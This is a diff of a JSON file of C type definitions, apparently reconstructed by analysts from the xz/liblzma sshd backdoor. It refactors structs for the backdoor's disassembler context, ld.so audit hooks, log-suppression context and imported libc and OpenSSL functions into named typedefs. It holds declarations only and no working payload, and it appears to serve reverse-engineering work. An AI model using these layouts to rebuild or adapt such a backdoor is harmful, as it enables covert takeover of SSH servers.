@@ -348,11 +348,18 @@
       "code": "typedef struct\n{\n  Elf64_Word p_type;\n  Elf64_Word p_flags;\n  Elf64_Off p_offset;\n  Elf64_Addr p_vaddr;\n  Elf64_Addr p_paddr;\n  Elf64_Xword p_filesz;\n  Elf64_Xword p_memsz;\n  Elf64_Xword p_align;\n} Elf64_Phdr;"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "Elf64_DynValue"
+      ],
+      "code": "typedef union\n{\n  Elf64_Xword d_val;\n  Elf64_Addr d_ptr;\n} Elf64_DynValue;"
+    },
+    {
       "kind": "struct",
       "names": [
         "Elf64_Dyn"
       ],
-      "code": "typedef struct\n{\n  Elf64_Sxword d_tag;\n  union\n    {\n      Elf64_Xword d_val;\n      Elf64_Addr d_ptr;\n    } d_un;\n} Elf64_Dyn;"
+      "code": "typedef struct\n{\n  Elf64_Sxword d_tag;\n  Elf64_DynValue d_un;\n} Elf64_Dyn;"
     },
     {
       "kind": "struct",
@@ -486,11 +493,25 @@
       "code": "typedef unsigned int point_conversion_form_t;"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "lzma_alloc_fn"
+      ],
+      "code": "typedef void *(*lzma_alloc_fn)(void *opaque, size_t nmemb, size_t size);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "lzma_free_fn"
+      ],
+      "code": "typedef void (*lzma_free_fn)(void *opaque, void *ptr);"
+    },
+    {
       "kind": "struct",
       "names": [
         "lzma_allocator"
       ],
-      "code": "typedef struct {\n void *(*alloc)(void *opaque, size_t nmemb, size_t size);\n void (*free)(void *opaque, void *ptr);\n void *opaque;\n} lzma_allocator;"
+      "code": "typedef struct {\n lzma_alloc_fn alloc;\n lzma_free_fn free;\n void *opaque;\n} lzma_allocator;"
     },
     {
       "kind": "typedef",
@@ -577,11 +598,81 @@
       "code": "struct La_x32_retval;"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "audit_activity_fn"
+      ],
+      "code": "typedef void (*audit_activity_fn)(uintptr_t *, unsigned int);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_objsearch_fn"
+      ],
+      "code": "typedef char *(*audit_objsearch_fn)(const char *, uintptr_t *, unsigned int);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_objopen_fn"
+      ],
+      "code": "typedef unsigned int (*audit_objopen_fn)(struct link_map *, Lmid_t, uintptr_t *);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_preinit_fn"
+      ],
+      "code": "typedef void (*audit_preinit_fn)(uintptr_t *);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_objclose_fn"
+      ],
+      "code": "typedef unsigned int (*audit_objclose_fn)(uintptr_t *);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "dl_audit_symbind_alt_fn"
+      ],
+      "code": "typedef void (*dl_audit_symbind_alt_fn)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_symbind64_fn"
+      ],
+      "code": "typedef uintptr_t (*audit_symbind64_fn)(\n  Elf64_Sym *sym, unsigned int ndx,\n  uptr *refcook, uptr *defcook,\n  unsigned int flags, const char *symname);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_symbind_fn_t"
+      ],
+      "code": "typedef union {\n  uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, unsigned int *, const char *);\n  uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, unsigned int *, const char *);\n } audit_symbind_fn_t;"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_pltenter_fn_t"
+      ],
+      "code": "typedef union {\n  Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, struct La_i86_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n  Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,\n   uintptr_t *,\n   uintptr_t *, struct La_x86_64_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n  Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, struct La_x32_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n } audit_pltenter_fn_t;"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "audit_pltexit_fn_t"
+      ],
+      "code": "typedef union {\n   unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, const struct La_i86_regs *,\n   struct La_i86_retval *, const char *);\n  unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,\n   uintptr_t *,\n   uintptr_t *,\n   const struct La_x86_64_regs *,\n   struct La_x86_64_retval *,\n   const char *);\n  unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *,\n   const struct La_x32_regs *,\n   struct La_x86_64_retval *,\n   const char *);\n } audit_pltexit_fn_t;"
+    },
+    {
       "kind": "struct",
       "names": [
         "audit_ifaces"
       ],
-      "code": "struct audit_ifaces\n{\n void (*activity) (uintptr_t *, unsigned int);\n char *(*objsearch) (const char *, uintptr_t *, unsigned int);\n unsigned int (*objopen) (struct link_map *, Lmid_t, uintptr_t *);\n void (*preinit) (uintptr_t *);\n union\n {\n  uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, unsigned int *, const char *);\n  uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, unsigned int *, const char *);\n };\n union\n {\n  Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, struct La_i86_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n  Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,\n   uintptr_t *,\n   uintptr_t *, struct La_x86_64_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n  Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, struct La_x32_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n };\n union\n {\n   unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, const struct La_i86_regs *,\n   struct La_i86_retval *, const char *);\n  unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,\n   uintptr_t *,\n   uintptr_t *,\n   const struct La_x86_64_regs *,\n   struct La_x86_64_retval *,\n   const char *);\n  unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *,\n   const struct La_x32_regs *,\n   struct La_x86_64_retval *,\n   const char *);\n };\n unsigned int (*objclose) (uintptr_t *);\n struct audit_ifaces *next;\n};"
+      "code": "struct audit_ifaces\n{\n audit_activity_fn activity;\n audit_objsearch_fn objsearch;\n audit_objopen_fn objopen;\n audit_preinit_fn preinit;\n audit_symbind_fn_t symbind;\n audit_pltenter_fn_t pltenter;\n audit_pltexit_fn_t pltexit;\n audit_objclose_fn objclose;\n struct audit_ifaces *next;\n};"
     },
     {
       "kind": "typedef",
@@ -745,11 +836,39 @@
       "code": "enum dasm_modrm_mask {\n XZ_MODRM_RM = 0xFF000000,\n XZ_MODRM_REG = 0x00FF0000,\n XZ_MODRM_MOD = 0x0000FF00,\n XZ_MODRM_RAW = 0x000000FF\n};"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "x86_rex_prefix_t"
+      ],
+      "code": "typedef union __attribute__((packed)) {\n struct __attribute__((packed)) {\n  u8 B : 1;\n  u8 X : 1;\n  u8 R : 1;\n  u8 W : 1;\n  u8 BitPattern : 4;\n } bits;\n u8 rex_byte;\n} x86_rex_prefix_t;"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "x86_modrm_info_t"
+      ],
+      "code": "typedef union __attribute__((packed)) {\n struct __attribute__((packed)) {\n  u8 modrm;\n  u8 modrm_mod;\n  u8 modrm_reg;\n  u8 modrm_rm;\n } breakdown;\n u32 modrm_word;\n} x86_modrm_info_t;"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "x86_prefix_fields_t"
+      ],
+      "code": "typedef struct __attribute__((packed)) {\n u8 flags;\n u8 flags2;\n u8 prefix_padding[2];\n u8 lock_rep_byte;\n u8 seg_byte;\n u8 osize_byte;\n u8 asize_byte;\n u8 vex_byte;\n u8 vex_byte2;\n u8 vex_byte3;\n x86_rex_prefix_t rex;\n x86_modrm_info_t modrm;\n} x86_prefix_fields_t;"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "x86_prefix_state_t"
+      ],
+      "code": "typedef union __attribute__((packed)) {\n x86_prefix_fields_t decoded;\n u16 flags_u16;\n} x86_prefix_state_t;"
+    },
+    {
       "kind": "struct",
       "names": [
         "dasm_ctx_t"
       ],
-      "code": "typedef struct __attribute__((packed)) dasm_ctx {\n u8* instruction;\n u64 instruction_size;\n union {\n  struct __attribute__((packed)) {\n   u8 flags;\n   u8 flags2;\n   u8 prefix_padding[2];\n   u8 lock_rep_byte;\n   u8 seg_byte;\n   u8 osize_byte;\n   u8 asize_byte;\n   u8 vex_byte;\n   u8 vex_byte2;\n   u8 vex_byte3;\n   union {\n    struct __attribute__((packed)) {\n     u8 B : 1;\n     u8 X : 1;\n     u8 R : 1;\n     u8 W : 1;\n     u8 BitPattern : 4;\n    } bits;\n    u8 rex_byte;\n   } rex;\n   union {\n    struct __attribute__((packed)) {\n             u8 modrm;\n             u8 modrm_mod;\n             u8 modrm_reg;\n             u8 modrm_rm;\n    } breakdown;\n    u32 modrm_word;\n   } modrm;\n  } decoded;\n  u16 flags_u16;\n } prefix;\n u8 imm64_reg;\n u8 sib_byte;\n u8 sib_scale_bits;\n u8 sib_index_bits;\n u8 sib_base_bits;\n u8 opcode_window[4];\n u8 branch_disp_scratch[4];\n u64 mem_disp;\n u64 operand;\n u64 operand_zeroextended;\n u64 operand_size;\n u8 insn_offset;\n u8 scratch_bytes[7];\n} dasm_ctx_t;"
+      "code": "typedef struct __attribute__((packed)) dasm_ctx {\n u8* instruction;\n u64 instruction_size;\n x86_prefix_state_t prefix;\n u8 imm64_reg;\n u8 sib_byte;\n u8 sib_scale_bits;\n u8 sib_index_bits;\n u8 sib_base_bits;\n u8 opcode_window[4];\n u8 branch_disp_scratch[4];\n u64 mem_disp;\n u64 operand;\n u64 operand_zeroextended;\n u64 operand_size;\n u8 insn_offset;\n u8 scratch_bytes[7];\n} dasm_ctx_t;"
     },
     {
       "kind": "struct",
@@ -759,11 +878,95 @@
       "code": "typedef struct __attribute__((packed)) elf_info {\n Elf64_Ehdr *elfbase;\n u64 first_vaddr;\n Elf64_Phdr *phdrs;\n u64 e_phnum;\n Elf64_Dyn *dyn;\n u64 dyn_num_entries;\n char *strtab;\n Elf64_Sym *symtab;\n Elf64_Rela *plt_relocs;\n u32 plt_relocs_num;\n BOOL gnurelro_found;\n u64 gnurelro_vaddr;\n u64 gnurelro_memsize;\n Elf64_Verdef *verdef;\n u64 verdef_num;\n Elf64_Versym *versym;\n Elf64_Rela *rela_relocs;\n u32 rela_relocs_num;\n u32 _unused0;\n Elf64_Relr *relr_relocs;\n u32 relr_relocs_num;\n u8 _unknown920[4];\n u64 code_segment_start;\n u64 code_segment_size;\n u64 rodata_segment_start;\n u64 rodata_segment_size;\n u64 data_segment_start;\n u64 data_segment_size;\n u64 data_segment_alignment;\n u8 flags;\n u8 _unknown939[7];\n u32 gnu_hash_nbuckets;\n u32 gnu_hash_last_bloom;\n u32 gnu_hash_bloom_shift;\n u8 _unknown949[4];\n u64 *gnu_hash_bloom;\n u32 *gnu_hash_buckets;\n u32 *gnu_hash_chain;\n} elf_info_t;"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "pfn_malloc_usable_size_t"
+      ],
+      "code": "typedef size_t (*pfn_malloc_usable_size_t)(void *ptr);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_getuid_t"
+      ],
+      "code": "typedef uid_t (*pfn_getuid_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_exit_t"
+      ],
+      "code": "typedef void (*pfn_exit_t)(int status);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_setresgid_t"
+      ],
+      "code": "typedef int (*pfn_setresgid_t)(gid_t rgid, gid_t egid, gid_t sgid);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_setresuid_t"
+      ],
+      "code": "typedef int (*pfn_setresuid_t)(uid_t ruid, uid_t euid, uid_t suid);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_system_t"
+      ],
+      "code": "typedef int (*pfn_system_t)(const char *command);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_write_t"
+      ],
+      "code": "typedef ssize_t (*pfn_write_t)(int fd, const void *buf, size_t count);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_pselect_t"
+      ],
+      "code": "typedef int (*pfn_pselect_t)(\n  int nfds, fd_set *readfds, fd_set *writefds,\n  fd_set *exceptfds, const struct timespec *timeout,\n  const sigset_t *sigmask);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_read_t"
+      ],
+      "code": "typedef ssize_t (*pfn_read_t)(int fd, void *buf, size_t count);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn___errno_location_t"
+      ],
+      "code": "typedef int *(*pfn___errno_location_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_setlogmask_t"
+      ],
+      "code": "typedef int (*pfn_setlogmask_t)(int mask);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_shutdown_t"
+      ],
+      "code": "typedef int (*pfn_shutdown_t)(int sockfd, int how);"
+    },
+    {
       "kind": "struct",
       "names": [
         "libc_imports_t"
       ],
-      "code": "typedef struct __attribute__((packed)) libc_imports {\n u32 resolved_imports_count;\n u8 _unknown993[4];\n size_t (*malloc_usable_size)(void *ptr);\n uid_t (*getuid)(void);\n void (*exit)(int status);\n int (*setresgid)(gid_t rgid, gid_t egid, gid_t sgid);\n int (*setresuid)(uid_t ruid, uid_t euid, uid_t suid);\n int (*system)(const char *command);\n ssize_t (*write)(int fd, const void *buf, size_t count);\n int (*pselect)(\n  int nfds, fd_set *readfds, fd_set *writefds,\n  fd_set *exceptfds, const struct timespec *timeout,\n  const sigset_t *sigmask);\n ssize_t (*read)(int fd, void *buf, size_t count);\n int *(*__errno_location)(void);\n int (*setlogmask)(int mask);\n int (*shutdown)(int sockfd, int how);\n void *__libc_stack_end;\n} libc_imports_t;"
+      "code": "typedef struct __attribute__((packed)) libc_imports {\n u32 resolved_imports_count;\n u8 _unknown993[4];\n pfn_malloc_usable_size_t malloc_usable_size;\n pfn_getuid_t getuid;\n pfn_exit_t exit;\n pfn_setresgid_t setresgid;\n pfn_setresuid_t setresuid;\n pfn_system_t system;\n pfn_write_t write;\n pfn_pselect_t pselect;\n pfn_read_t read;\n pfn___errno_location_t __errno_location;\n pfn_setlogmask_t setlogmask;\n pfn_shutdown_t shutdown;\n void *__libc_stack_end;\n} libc_imports_t;"
     },
     {
       "kind": "typedef",
@@ -787,11 +990,207 @@
       "code": "typedef void (*pfn_RSA_get0_key_t)(\n const RSA *r,\n const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "pfn_DSA_get0_pqg_t"
+      ],
+      "code": "typedef void (*pfn_DSA_get0_pqg_t)(\n  const DSA *d, const BIGNUM **p,\n  const BIGNUM **q, const BIGNUM **g);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_DSA_get0_pub_key_t"
+      ],
+      "code": "typedef const BIGNUM *(*pfn_DSA_get0_pub_key_t)(const DSA *d);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EC_POINT_point2oct_t"
+      ],
+      "code": "typedef size_t (*pfn_EC_POINT_point2oct_t)(\n  const EC_GROUP *group, const EC_POINT *p,\n  point_conversion_form_t form, unsigned char *buf,\n  size_t len, BN_CTX *ctx);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EC_KEY_get0_public_key_t"
+      ],
+      "code": "typedef EC_POINT *(*pfn_EC_KEY_get0_public_key_t)(const EC_KEY *key);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EC_KEY_get0_group_t"
+      ],
+      "code": "typedef const EC_GROUP *(*pfn_EC_KEY_get0_group_t)(const EC_KEY *key);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_sha256_t"
+      ],
+      "code": "typedef EVP_MD *(*pfn_EVP_sha256_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_BN_num_bits_t"
+      ],
+      "code": "typedef int (*pfn_BN_num_bits_t)(const BIGNUM *a);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_PKEY_new_raw_public_key_t"
+      ],
+      "code": "typedef EVP_PKEY *(*pfn_EVP_PKEY_new_raw_public_key_t)(\n  int type, ENGINE *e,\n  const unsigned char *key, size_t keylen);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_MD_CTX_new_t"
+      ],
+      "code": "typedef EVP_MD_CTX *(*pfn_EVP_MD_CTX_new_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_DigestVerifyInit_t"
+      ],
+      "code": "typedef int (*pfn_EVP_DigestVerifyInit_t)(\n  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,\n  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_DigestVerify_t"
+      ],
+      "code": "typedef int (*pfn_EVP_DigestVerify_t)(\n  EVP_MD_CTX *ctx, const unsigned char *sig,\n  size_t siglen, const unsigned char *tbs, size_t tbslen);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_MD_CTX_free_t"
+      ],
+      "code": "typedef void (*pfn_EVP_MD_CTX_free_t)(EVP_MD_CTX *ctx);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_PKEY_free_t"
+      ],
+      "code": "typedef void (*pfn_EVP_PKEY_free_t)(EVP_PKEY *key);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_CIPHER_CTX_new_t"
+      ],
+      "code": "typedef EVP_CIPHER_CTX *(*pfn_EVP_CIPHER_CTX_new_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_DecryptInit_ex_t"
+      ],
+      "code": "typedef int (*pfn_EVP_DecryptInit_ex_t)(\n  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,\n  ENGINE *impl, const unsigned char *key, const unsigned char *iv);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_DecryptUpdate_t"
+      ],
+      "code": "typedef int (*pfn_EVP_DecryptUpdate_t)(\n  EVP_CIPHER_CTX *ctx, unsigned char *out,\n  int *outl, const unsigned char *in, int inl);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_DecryptFinal_ex_t"
+      ],
+      "code": "typedef int (*pfn_EVP_DecryptFinal_ex_t)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_CIPHER_CTX_free_t"
+      ],
+      "code": "typedef void (*pfn_EVP_CIPHER_CTX_free_t)(EVP_CIPHER_CTX *ctx);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_chacha20_t"
+      ],
+      "code": "typedef const EVP_CIPHER *(*pfn_EVP_chacha20_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_RSA_new_t"
+      ],
+      "code": "typedef RSA *(*pfn_RSA_new_t)(void);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_BN_dup_t"
+      ],
+      "code": "typedef BIGNUM *(*pfn_BN_dup_t)(const BIGNUM *from);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_BN_bin2bn_t"
+      ],
+      "code": "typedef BIGNUM *(*pfn_BN_bin2bn_t)(const unsigned char *s, int len, BIGNUM *ret);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_RSA_set0_key_t"
+      ],
+      "code": "typedef int (*pfn_RSA_set0_key_t)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_EVP_Digest_t"
+      ],
+      "code": "typedef int (*pfn_EVP_Digest_t)(\n  const void *data, size_t count, unsigned char *md,\n  unsigned int *size, const EVP_MD *type, ENGINE *impl);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_RSA_sign_t"
+      ],
+      "code": "typedef int (*pfn_RSA_sign_t)(\n  int type,\n  const unsigned char *m, unsigned int m_len,\n  unsigned char *sigret, unsigned int *siglen, RSA *rsa);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_BN_bn2bin_t"
+      ],
+      "code": "typedef int (*pfn_BN_bn2bin_t)(const BIGNUM *a, unsigned char *to);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_RSA_free_t"
+      ],
+      "code": "typedef void (*pfn_RSA_free_t)(RSA *rsa);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "pfn_BN_free_t"
+      ],
+      "code": "typedef void (*pfn_BN_free_t)(BIGNUM *a);"
+    },
+    {
       "kind": "struct",
       "names": [
         "imported_funcs_t"
       ],
-      "code": "typedef struct __attribute__((packed)) imported_funcs {\n pfn_RSA_public_decrypt_t RSA_public_decrypt;\n pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;\n void (*RSA_get0_key_null)(\n  const RSA *r, const BIGNUM **n,\n  const BIGNUM **e, const BIGNUM **d);\n pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt;\n pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt;\n pfn_RSA_get0_key_t *RSA_get0_key_plt;\n void (*DSA_get0_pqg)(\n  const DSA *d, const BIGNUM **p,\n  const BIGNUM **q, const BIGNUM **g);\n const BIGNUM *(*DSA_get0_pub_key)(const DSA *d);\n size_t (*EC_POINT_point2oct)(\n  const EC_GROUP *group, const EC_POINT *p,\n  point_conversion_form_t form, unsigned char *buf,\n  size_t len, BN_CTX *ctx);\n EC_POINT *(*EC_KEY_get0_public_key)(const EC_KEY *key);\n const EC_GROUP *(*EC_KEY_get0_group)(const EC_KEY *key);\n EVP_MD *(*EVP_sha256)(void);\n pfn_RSA_get0_key_t RSA_get0_key;\n int (*BN_num_bits)(const BIGNUM *a);\n EVP_PKEY *(*EVP_PKEY_new_raw_public_key)(\n  int type, ENGINE *e,\n  const unsigned char *key, size_t keylen);\n EVP_MD_CTX *(*EVP_MD_CTX_new)(void);\n int (*EVP_DigestVerifyInit)(\n  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,\n  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);\n int (*EVP_DigestVerify)(\n  EVP_MD_CTX *ctx, const unsigned char *sig,\n  size_t siglen, const unsigned char *tbs, size_t tbslen);\n void (*EVP_MD_CTX_free)(EVP_MD_CTX *ctx);\n void (*EVP_PKEY_free)(EVP_PKEY *key);\n EVP_CIPHER_CTX *(*EVP_CIPHER_CTX_new)(void);\n int (*EVP_DecryptInit_ex)(\n  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,\n  ENGINE *impl, const unsigned char *key, const unsigned char *iv);\n int (*EVP_DecryptUpdate)(\n  EVP_CIPHER_CTX *ctx, unsigned char *out,\n  int *outl, const unsigned char *in, int inl);\n int (*EVP_DecryptFinal_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);\n void (*EVP_CIPHER_CTX_free)(EVP_CIPHER_CTX *ctx);\n const EVP_CIPHER *(*EVP_chacha20)(void);\n RSA *(*RSA_new)(void);\n BIGNUM *(*BN_dup)(const BIGNUM *from);\n BIGNUM *(*BN_bin2bn)(const unsigned char *s, int len, BIGNUM *ret);\n int (*RSA_set0_key)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);\n int (*EVP_Digest)(\n  const void *data, size_t count, unsigned char *md,\n  unsigned int *size, const EVP_MD *type, ENGINE *impl);\n int (*RSA_sign)(\n  int type,\n  const unsigned char *m, unsigned int m_len,\n  unsigned char *sigret, unsigned int *siglen, RSA *rsa);\n int (*BN_bn2bin)(const BIGNUM *a, unsigned char *to);\n void (*RSA_free)(RSA *rsa);\n void (*BN_free)(BIGNUM *a);\n libc_imports_t *libc;\n u32 resolved_imports_count;\n u32 reserved_imports_padding;\n} imported_funcs_t;"
+      "code": "typedef struct __attribute__((packed)) imported_funcs {\n pfn_RSA_public_decrypt_t RSA_public_decrypt;\n pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;\n pfn_RSA_get0_key_t RSA_get0_key_null;\n pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt;\n pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt;\n pfn_RSA_get0_key_t *RSA_get0_key_plt;\n pfn_DSA_get0_pqg_t DSA_get0_pqg;\n pfn_DSA_get0_pub_key_t DSA_get0_pub_key;\n pfn_EC_POINT_point2oct_t EC_POINT_point2oct;\n pfn_EC_KEY_get0_public_key_t EC_KEY_get0_public_key;\n pfn_EC_KEY_get0_group_t EC_KEY_get0_group;\n pfn_EVP_sha256_t EVP_sha256;\n pfn_RSA_get0_key_t RSA_get0_key;\n pfn_BN_num_bits_t BN_num_bits;\n pfn_EVP_PKEY_new_raw_public_key_t EVP_PKEY_new_raw_public_key;\n pfn_EVP_MD_CTX_new_t EVP_MD_CTX_new;\n pfn_EVP_DigestVerifyInit_t EVP_DigestVerifyInit;\n pfn_EVP_DigestVerify_t EVP_DigestVerify;\n pfn_EVP_MD_CTX_free_t EVP_MD_CTX_free;\n pfn_EVP_PKEY_free_t EVP_PKEY_free;\n pfn_EVP_CIPHER_CTX_new_t EVP_CIPHER_CTX_new;\n pfn_EVP_DecryptInit_ex_t EVP_DecryptInit_ex;\n pfn_EVP_DecryptUpdate_t EVP_DecryptUpdate;\n pfn_EVP_DecryptFinal_ex_t EVP_DecryptFinal_ex;\n pfn_EVP_CIPHER_CTX_free_t EVP_CIPHER_CTX_free;\n pfn_EVP_chacha20_t EVP_chacha20;\n pfn_RSA_new_t RSA_new;\n pfn_BN_dup_t BN_dup;\n pfn_BN_bin2bn_t BN_bin2bn;\n pfn_RSA_set0_key_t RSA_set0_key;\n pfn_EVP_Digest_t EVP_Digest;\n pfn_RSA_sign_t RSA_sign;\n pfn_BN_bn2bin_t BN_bn2bin;\n pfn_RSA_free_t RSA_free;\n pfn_BN_free_t BN_free;\n libc_imports_t *libc;\n u32 resolved_imports_count;\n u32 reserved_imports_padding;\n} imported_funcs_t;"
     },
     {
       "kind": "struct",
@@ -857,11 +1256,18 @@
       "code": "typedef void (*log_handler_fn)(\n LogLevel level,\n int forced,\n const char *msg,\n void *ctx);"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "mm_log_handler_fn"
+      ],
+      "code": "typedef void (*mm_log_handler_fn)(LogLevel level, int forced, const char *msg, void *ctx);"
+    },
+    {
       "kind": "struct",
       "names": [
         "sshd_log_ctx_t"
       ],
-      "code": "typedef struct __attribute__((packed)) sshd_log_ctx {\n BOOL logging_disabled;\n BOOL log_hooking_possible;\n BOOL syslog_disabled;\n u8 log_padding[4];\n char *STR_percent_s;\n char *STR_Connection_closed_by;\n char *STR_preauth;\n char *STR_authenticating;\n char *STR_user;\n void *log_handler_ptr;\n void *log_handler_ctx_ptr;\n log_handler_fn orig_log_handler;\n void *orig_log_handler_ctx;\n void *sshlogv;\n void (*mm_log_handler)(int level, int forced, const char *msg, void *ctx);\n} sshd_log_ctx_t;"
+      "code": "typedef struct __attribute__((packed)) sshd_log_ctx {\n BOOL logging_disabled;\n BOOL log_hooking_possible;\n BOOL syslog_disabled;\n u8 log_padding[4];\n char *STR_percent_s;\n char *STR_Connection_closed_by;\n char *STR_preauth;\n char *STR_authenticating;\n char *STR_user;\n void *log_handler_ptr;\n void *log_handler_ctx_ptr;\n log_handler_fn orig_log_handler;\n void *orig_log_handler_ctx;\n void *sshlogv;\n mm_log_handler_fn mm_log_handler;\n} sshd_log_ctx_t;"
     },
     {
       "kind": "union",
@@ -910,7 +1316,7 @@
       "names": [
         "ldso_ctx_t"
       ],
